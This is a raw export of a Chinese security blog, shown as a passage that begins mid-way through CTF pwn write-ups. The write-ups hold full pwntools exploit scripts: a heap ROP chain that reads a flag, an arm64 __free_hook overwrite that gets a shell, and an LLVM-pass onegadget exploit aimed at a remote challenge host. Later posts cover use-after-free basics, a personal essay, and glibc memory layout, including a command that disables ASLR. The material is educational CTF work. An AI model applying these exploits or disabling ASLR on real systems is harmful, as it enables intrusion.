class="line">del_player_by_id(5)</span><br><span class="line">del_player_by_id(1)</span><br><span class="line">create_player(1,0x228,b<span class="string">&#x27;\x00&#x27;</span>*0x28+p64(0x31)+p64(libc.sym[<span class="string">&#x27;environ&#x27;</span>]-0x28))</span><br><span class="line">create_player(2,0x228,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create_player(5,0x228,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create_player(3,0x28,<span class="string">&#x27;a&#x27;</span>*0x28)</span><br><span class="line">display_all()</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*0x28)</span><br><span class="line">stack  = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>) -0x510</span><br><span class="line"><span class="built_in">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">del_player_by_id(2)</span><br><span class="line">del_player_by_id(5)</span><br><span class="line">del_player_by_id(1)</span><br><span class="line">create_player(1,0x228,b<span class="string">&#x27;\x00&#x27;</span>*0x58+p64(0x31)+p64(stack))</span><br><span class="line">create_player(2,0x228,b<span class="string">&#x27;\x00&#x27;</span>*0x58+p64(0x31)+p64(stack))</span><br><span class="line">create_player(5,0x228,<span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#create_player(2,0x228,b&#x27;\x00&#x27;*0x58+p64(0x31)+p64(stack))</span></span><br><span class="line"></span><br><span class="line">pop_rax = 0x0000000000043a78 + libc.address</span><br><span class="line">pop_rdi = 0x000000000002155f + libc.address</span><br><span class="line">pop_rsi = 0x0000000000023e8a + libc.address</span><br><span class="line">pop_rdx = 0x0000000000001b96 + libc.address</span><br><span class="line">syscall = 0x11B957 + libc.address</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(2)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(stack + 0xb8)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(4)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(4)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(3)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(stack + 0x200)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(0x100)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(1)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(1)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">payload += <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line">create_player(8,0x228,payload)</span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(p,&#x27;</span>b *<span class="variable">$rebase</span>(0x1D74)<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><p>arm64位的pwn题，静态地址，存在UAF的问题，劫持链表的下一项即可实现任意地址free（需符合size检查）。<br>将tcache结构加入到链表中，再申请一个较小的chunk，即可实现堆溢出，然后劫持到__free_hook，并修改为system函数，即可getshell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#x/20x 0x4000012018</span></span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./channel&#x27;,&#x27;b *0x40000010f8&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;124.71.230.240&quot;</span>,<span class="string">&quot;26027&quot;</span>)</span><br><span class="line">def regsiter(key):</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;key&gt; &quot;</span>)</span><br><span class="line">p.send(key)</span><br><span class="line">def unregsiter(key):</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;key&gt; &quot;</span>)</span><br><span class="line">p.send(key)</span><br><span class="line">def show(key):</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;key&gt; &quot;</span>)</span><br><span class="line">p.send(key)</span><br><span class="line">def edit(key,size,data):</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;key&gt; &quot;</span>)</span><br><span class="line">p.send(key)</span><br><span class="line">p.recvuntil(<span class="string">&quot;len&gt; &quot;</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;content&gt; &quot;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">free_got = 0x11F30+0x4000000000</span><br><span class="line">regsiter(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">edit(<span class="string">&quot;111&quot;</span>,0x1f8,b<span class="string">&#x27;2&#x27;</span>*8+b<span class="string">&#x27;\x00&#x27;</span>*0xf8+p64(0x40009bca30)+p64(0x4000011FC8))</span><br><span class="line">edit(<span class="string">&quot;111&quot;</span>,0x1c8,b<span class="string">&#x27;2&#x27;</span>*8+b<span class="string">&#x27;\x00&#x27;</span>*0xf8+p64(0x40009bca30)+p64(0x4000011FC8))</span><br><span class="line">regsiter(<span class="string">&quot;222&quot;</span>)</span><br><span class="line">regsiter(<span class="string">&quot;333&quot;</span>)</span><br><span class="line">unregsiter(<span class="string">&quot;222&quot;</span>)</span><br><span class="line">edit(<span class="string">&quot;111&quot;</span>,0x110,b<span class="string">&#x27;2&#x27;</span>*8+b<span class="string">&#x27;\x00&#x27;</span>*0xf8+p64(0x40009bca30)+p64(0x4000011FC8))</span><br><span class="line">show(<span class="string">&#x27;2&#x27;</span>*8)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">libc_base = u64(p.recv(3).ljust(8,b<span class="string">&#x27;\x00&#x27;</span>))<span class="comment">#+0x4000000000 -0x16E630+0xe8</span></span><br><span class="line">libc_base = 0x4000848000</span><br><span class="line"><span class="built_in">print</span>(hex(libc_base))</span><br><span class="line"><span class="comment">#8f0</span></span><br><span class="line"><span class="comment">#4e0</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">/etc/qemu-binfmt/aarch64/lib/ld-linux-aarch64.so.1</span></span><br><span class="line"><span class="string">/etc/qemu-binfmt/aarch64/lib/libc.so.6</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="string">&#x27;333&#x27;</span>,0x100,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">unregsiter(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">regsiter(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">regsiter(<span class="string">&quot;222&quot;</span>)</span><br><span class="line">regsiter(<span class="string">&quot;444&quot;</span>)</span><br><span class="line">unregsiter(<span class="string">&quot;222&quot;</span>)</span><br><span class="line">edit(<span class="string">&quot;111&quot;</span>,0x110,b<span class="string">&#x27;2&#x27;</span>*8+b<span class="string">&#x27;\x00&#x27;</span>*0xf8+p64(0x40009bc000)+p64(0x4000011fb8))</span><br><span class="line"></span><br><span class="line">regsiter(<span class="string">&quot;555&quot;</span>)</span><br><span class="line">edit(p64(0)+p64(0x291)+b<span class="string">&#x27;\x00&#x27;</span>*0x1c+p32(0x10000)+b<span class="string">&#x27;\x00&#x27;</span>*0x5c+p64(0x00000),0x20,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">show(<span class="string">&#x27;2&#x27;</span>*8)</span><br><span class="line">regsiter(<span class="string">&quot;666&quot;</span>)</span><br><span class="line">unregsiter(<span class="string">&quot;555&quot;</span>)</span><br><span class="line">unregsiter(<span class="string">&quot;666&quot;</span>)</span><br><span class="line">edit(<span class="string">&#x27;444&#x27;</span>,0x100,p64(0)*3+p64(0x100)+p64(libc_base+0x16FC30))</span><br><span class="line">regsiter(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">regsiter(p64(0x40568+libc_base))</span><br><span class="line">unregsiter(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="comment">#show(&#x27;2&#x27;*8)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="satool"><a href="#satool" class="headerlink" title="satool"></a>satool</h2><p>跟2021红帽有点类似，调试出了几个函数save、stealkey、fakekey、run。run可以执行一个指针处的函数，save会为这个指针申请地址，通过特定的申请可以得到unsortbin的，stealkey会将当前的指针的值存储起来，fakekey会将上面存储的值与传入的参数相加。所以可以利用unsortbin泄漏出libc，然后用stealkey保存，fakekey计算偏移到onegadget，最后用run运行即可getshell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(<span class="string">&quot;clang -emit-llvm -S exp.c -o exp.bc&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">os.system(&quot;opt -load ./SAPass.so -SAPass ./exp.bc&quot;)</span></span><br><span class="line"><span class="string">p = gdb.debug([&quot;opt&quot;,&#x27;</span>-load<span class="string">&#x27;,&#x27;</span>./SAPass.so<span class="string">&#x27;,&#x27;</span>-SAPass<span class="string">&#x27;,&#x27;</span>./exp.bc<span class="string">&#x27;])</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;124.71.230.240&#x27;</span></span><br><span class="line">port = 25989</span><br><span class="line">con = remote(ip, port)</span><br><span class="line">f = open(<span class="string">&quot;./exp.bc&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=f.read()</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">payload2 = payload.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">con.sendlineafter(<span class="string">&quot;bitcode: \n&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line">con.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">void save(char * a,int b);</span><br><span class="line">void takeaway();</span><br><span class="line">void stealkey();</span><br><span class="line">void fakekey(int a);</span><br><span class="line">void run();</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">B4ckDo0r</span></span>()&#123;</span><br><span class="line">int a[2];</span><br><span class="line">a[0]= 0x20;</span><br><span class="line">a[1] = 2;</span><br><span class="line">char * b = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">save(b,0x28);</span><br><span class="line">save(b,0x28);</span><br><span class="line">save(b,0x28);</span><br><span class="line">save(b,0x28);</span><br><span class="line">save(b,0x28);</span><br><span class="line">save(b,0x28);</span><br><span class="line">save(b,0x28);</span><br><span class="line">save(b,0x28);</span><br><span class="line">save(b,0x28);</span><br><span class="line">save(b,0x28);</span><br><span class="line">stealkey();</span><br><span class="line">fakekey(0xFFFFFFFFFFC63615+0x16d);</span><br><span class="line">run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>UAF漏洞初探</title>
    <link href="/2021/05/03/UAF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/05/03/UAF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="UAF原理"><a href="#UAF原理" class="headerlink" title="UAF原理"></a>UAF原理</h2><p>上代码！！！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">char *p1;</span><br><span class="line">p1=(char *)malloc(sizeof(char)*10);</span><br><span class="line">memcpy(p1,<span class="string">&quot;hello&quot;</span>,10);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p1 addr:%x,%s\n&quot;</span>,p1,p1);</span><br><span class="line">free(p1);</span><br><span class="line">char *p2;</span><br><span class="line">p2=(char *)malloc(sizeof(char)*10);</span><br><span class="line">memcpy(p2,<span class="string">&quot;world&quot;</span>,10);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p2 addr:%x,%s\n&quot;</span>,p2,p1);</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码所示，<br>指针p1申请内存，打印其地址和字符串，然后释放p1<br>然后指针p2申请同样大小的内存，打印p2的地址和值<br>GCC编译，运行结果如下：<br><img src="/2021/05/03/UAF%E6%BC%8F%E6%B4%9E/1.png" alt="1.png"><br>p1与p2地址相同，p1指针释放后，p2申请相同大小的内存，操作系统会将之前给p1分配的地址分配给p2，修改p2的值，p1也被修改了。</p><p>结论：<br>1.在free掉一块内存后，紧接着申请大小相同的内存，操作系统会将刚刚free掉的内存再次分配。<br>2.通过p2能够操作p1，如果之后p1继续被使用（use after free），则可以通过p2修改程序功能等目的。</p><p>根本原因：说来话长，可以尝试理解dlmalloc</p><h2 id="dlmalloc详解"><a href="#dlmalloc详解" class="headerlink" title="dlmalloc详解"></a>dlmalloc详解</h2><p>c语言程序会向栈和堆申请内存，小块内存向栈申请，函数调用结束后程序会自动释放内存。大块内存向堆申请，需要自己释放，否则会造成内存泄露。</p><p>堆的申请涉及到动态内存管理，包括内核层面和用户层面。linux内核向应用程序提供了接口（系统调用brk和mmap），当应用程序需要申请内存时向内核提出请求。</p><p>内存分配器避免了应用程序直接调用brk和mmap，应用程序在申请内存时，直接向内存分配器提交申请。有了内存分配器，我们可以避免brk和mmap的系统调用而直接通过malloc和free两个接口函数管理内存。申请内存时，内存分配器会一次向内核申请大量内存，然后分批交给应用程序，从而提高了效率。释放内存时，应用程序也是将内存释放给内存分配器，内存分配器在合适的时候再将内存释放回内核。</p><p>dlmalloc就是一种内存分配器，用于Android系统。而linux中采用的是ptmalloc内存分配器，它在dlmalloc的基础上进行了改进，以更好适应多线程。dlmalloc采用两种方式申请内存，如果应用程序单次申请的内存量小于256kb，dlmalloc调用brk()扩展进程堆空间，但是dlmalloc向内存申请的内存量大于应用程序申请的内存量，申请到内存后dlmalloc将内存分成两块，一块返回给应用程序，另一块作为空闲内存先保留起来。下次应用程序申请内存时dlmalloc就不需要向内核申请内存了，从而加快分配效率。当应用程序调用free释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放回内核，二是供应用程序下次申请内存使用。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放回内核。如果应用程序申请的内存大于256kb,dlmalloc调用mmap()向内存内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p><p>brk()系统调用可以扩充或收缩堆的大小，mmap()向内核申请内存，munmap则释放内存。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>人活着就是为了——北京邮电大学</title>
    <link href="/2021/05/02/%E4%BA%BA%E6%B4%BB%E7%9D%80%E5%B0%B1%E6%98%AF%E4%B8%BA%E4%BA%86%E2%80%94%E2%80%94%E5%8C%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/"/>
    <url>/2021/05/02/%E4%BA%BA%E6%B4%BB%E7%9D%80%E5%B0%B1%E6%98%AF%E4%B8%BA%E4%BA%86%E2%80%94%E2%80%94%E5%8C%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="与网络安全结缘"><a href="#与网络安全结缘" class="headerlink" title="与网络安全结缘"></a>与网络安全结缘</h2><p>高考填志愿都是十分随便的，分数踩上了就报了电子信息工程这个专业，好像还和计算机由那么一点点联系。<br>填都填了那就读呗。<br>刚刚进入大一，一切都是那么的新奇。大学校园摆脱了高中的枯燥，要协会有协会，要部门有部门，好玩的活动一大堆，于是抱着尝试新奇事物的心情开始了大学生涯。<br>我本身爱好就十分广泛，就大一上个学期就玩遍了各种协会（网络安全协会也加了，那时候还沉寂着），加了一个部门，其中包括程序设计协会，开始蹒跚学C，写着那些看上去很牛逼的算法。<br>但是所有的变化都源自于一位17级电信学长不经意的一句话。<br>就在半学期之后，我瞬间退了所有协会部门的群，专心学C语言，那时候还在网上整了贪吃蛇程序玩了一下。<br>但是网上找了各种关于IT和程序员的资料，发现学会C语言也没什么大不了的。当时回忆起了高中时代在电视剧上看的黑客情景，就对黑客着了迷。<br>当时是没心情认真准备期末考的。后半个学期天天搜黑客关键字，迷上了command命令，据说黑客都是通过命令行攻击的。从网上还知道了各种厉害的黑客人物。有一次在群里面看到了国科培训，也过去听了几天。<br>期末考虽然没挂科，但是也成绩平平。</p><p>到了下学期，正值疫情期间，开始在网络安全协会里面混，整了个CSDN账号，抱紧各种大佬的大腿。当时杂项、密码学、web满天飞，糊里糊涂地下了各种工具，还专门从百度云找了web入门视频（虽然到现在都没用过)。<br>半个学期的时光又虚度了，平时不好好读书写作业，却在这玩意上耗了不少时间。<br>后来在一位大佬的引荐下（其人可是现在的360网络安全研究员），我混进了内部群。啧啧，群除我佬，但是就是没有二进制佬。于是心中就萌生了新的想法。<br>那不如学二进制吧，反正电信也是吃底层的，学得不好也可以在里面凑凑数，至少有学底层的萌新了。<br>然后又是百度关键词满天飞，搜了一大堆的入门资料，反正是没学会，弯路倒是走了不少。</p><p>pwn就这么搞了几个月，就在我快要弃坑的时候，当时安全的群又退了几个。又是那位360大佬提点我。我永远都忘不了那一天，如果没有那一次，我估计要永远与网络安全失之交臂了。就是他，给了我继续学习网安的希望。<br>因为对于一个萌新而言，而且是唯一一个学二进制的选手，在没有二进制大佬的带领下，仅仅靠百度关键词的搜索，学习是非常困难的。当时想学二进制，但是又不知从何学起。<br>坑都入了，那就学到海枯石烂吧，这是我一个人的主场。</p><h2 id="幸运的转折"><a href="#幸运的转折" class="headerlink" title="幸运的转折"></a>幸运的转折</h2><p>期末考不用说了，又是60分万岁。但是我在pwn的道路上才刚刚开始。<br>大二一开学，我强行挤进实验室，这真是个堪比穆斯林心目中的耶路撒冷，是个神圣的地方。在网安摸爬滚打一个学期后，20网安新生的到来给了我惊喜，这就意味着，我可以拉人下水，再也不用孤军奋战，一个人正这个没有尽头的pwn了。而且我拉的学弟个个生猛，学pwn一点也不虚。</p><h2 id="思想的洗礼"><a href="#思想的洗礼" class="headerlink" title="思想的洗礼"></a>思想的洗礼</h2><p>我是一个电信专业中不折不扣的混子选手，因为我不喜欢电信专业，我只是尽可能保持着0补考的战绩。但是我对不朽的追求却从来没有停止过。<br>除了学网安以外，我的确是一个爱好广泛的人。<br>为了学英语，课余时间我会抽时间看记录片，至今已经积累了几百个视频，从图书馆阅读外刊。<br>为了学商业知识，我还特意把巴菲特的投资哲学阅读了好多遍，十分了解股市原理。<br>为了阅读更多的鸡汤，我还与我们的专业第一成为了好友，同时我们还是老乡，现在是知己。</p><p>我只是一名工科生，但是长期阅读的积累给我带来了内在的改变。也许是看多了拿破仑、亚历山大、巴菲特、武则天，接触了太多的本校的电信、网安、计科大佬和外校的985大牛，从阅读中积累了太多太多的鸡汤，在操场上跑了太多太多圈，看多了太多的人类思维、学习方法，我的三观一直不断的被重塑。在之前，我就甘愿成为一个宇宙中一个不起眼的沙砾；但现在，我就渴望成为能够让海洋波涛汹涌的浪花。<br>阅读和文学的洗礼真的能改变一个人。</p><h2 id="艰难的抉择"><a href="#艰难的抉择" class="headerlink" title="艰难的抉择"></a>艰难的抉择</h2><p>今已经大二下了，虽然网安进展缓慢，但是依然没有放弃的心。电信与我无缘，那我就考到网安。<br>这个问题其实一直萦绕在我的脑海里，必须二选一。条条大路通罗马，这世界上并不缺路可走，难的是选择一条道路并鼓起勇气一直走下去。<br>不管如何抉择，我都知道，长板决定了上限。<br>既然要走，就要走的最好；既然要走，就要走去最远的地方。<br>因为：<br><img src="/2021/05/03/%E4%BA%BA%E6%B4%BB%E7%9D%80%E5%B0%B1%E6%98%AF%E4%B8%BA%E4%BA%86%E2%80%94%E2%80%94%E5%8C%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/1.png" alt="1.png"><br>在此沿用丘吉尔和特朗普的优良传统：NEVER EVER GIVE UP!<br>祝自己考研顺利！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>堆溢出必备基础——Glibc内存管理与ptmalloc源码分析（1）</title>
    <link href="/2021/05/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/"/>
    <url>/2021/05/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="一、什么是glibc？glibc与libc的区别？"><a href="#一、什么是glibc？glibc与libc的区别？" class="headerlink" title="一、什么是glibc？glibc与libc的区别？"></a>一、什么是glibc？glibc与libc的区别？</h2><p>glibc和libc都是linux下的c函数库，但是libc是linux下的ANSI C的函数库，glibc是GUN C的函数库。</p><p>glibc是gnu发布的libc库，也是c运行库。glibc是linux系统中最底层的API（应用程序开发接口），几乎其他任何的运行库都会依赖于glibc。glibc封装了linux操作系统所提供的系统服务。</p><p>延伸问题——ANSI C和GUN C是什么玩意？<br>ANSI C：美国国家标准协会（ANSI）对C语言发布的标准<br>GUN C：简单理解为GUN组织对C语言发布的标准</p><h2 id="二、linux进程内存布局"><a href="#二、linux进程内存布局" class="headerlink" title="二、linux进程内存布局"></a>二、linux进程内存布局</h2><h3 id="32位模式下进程内存经典布局"><a href="#32位模式下进程内存经典布局" class="headerlink" title="32位模式下进程内存经典布局"></a>32位模式下进程内存经典布局</h3><p><img src="/2021/05/02/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/1.png" alt="1.png"></p><p>这种布局是linux内核2.6.7以前的默认进程内存布局形式，mmap区域和栈区域相对增长，这意味着堆中只有1GB的内存地址空间可以使用，继续增长就会进入mmap映射区域，这是该内核版本的缺陷。这是由于32位模式地址空间限制造成的，所以内核引入了另一种虚拟地址空间的布局形式。但是对于64位系统而言，它提供了巨大的虚拟地址空间，这种布局就相当好。</p><h3 id="32位模式下进程默认内存布局"><a href="#32位模式下进程默认内存布局" class="headerlink" title="32位模式下进程默认内存布局"></a>32位模式下进程默认内存布局</h3><p><img src="/2021/05/02/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/2.png" alt="2.png"></p><p>从上图可以看到，栈至顶向下扩展，并且栈是有界的。堆至底向上扩展，mmap映射区域至顶向下扩展，直至耗尽虚拟地址空间中的剩余区域，这种结构便于C运行时库使用mmap映射区域和堆进行内存分配。上图的布局形式是在内核2.6.7以后才引入的，这是32位模式下进程的默认内存布局形式。</p><h3 id="64位模式下进程内存布局"><a href="#64位模式下进程内存布局" class="headerlink" title="64位模式下进程内存布局"></a>64位模式下进程内存布局</h3><p>在64位模式下各个区域的起始位置是什么呢？对于AMD64系统，内存布局采用经典内存布局，text的起始地址为，text的起始地址为0x0000000000400000，堆紧接着BSS段向上增长，mmap映射区域开始位置一般设为TASK_SIZE/3。<br>下面的图我其实看不懂（不知道怎么算地址）直接贴出来：<br><img src="/2021/05/02/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/3.png" alt="3.png"></p><p><img src="/2021/05/02/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/4.png" alt="4.png"><br>上图是X86_64下的linux进程的默认内存布局形式，这只是一个示意图，当前内核默认配置下，进程的栈和mmap映射区域并不是从一个固定地址开始，并且每次启动时的值都不一样，这是程序启动时随机改变这些值的设置，使得使用缓冲区溢出进行攻击更加困难。在CTF中，这种保护叫做ASLR。当然也可以让进程中的栈和mmap映射区域从一个固定位置开始，只需要设置全局变量randomize_va_space的值为0，这个变量默认值为1。用户可以通过设置/proc/sys/kernel/randomize_va_space来停用该特性，也可以用如下命令：<br>sudo sysctl -w kernel.randomize_va_space=0</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>通过GDB调试理解GOT表和PLT表</title>
    <link href="/2021/04/30/%E9%80%9A%E8%BF%87GDB%E8%B0%83%E8%AF%95%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/"/>
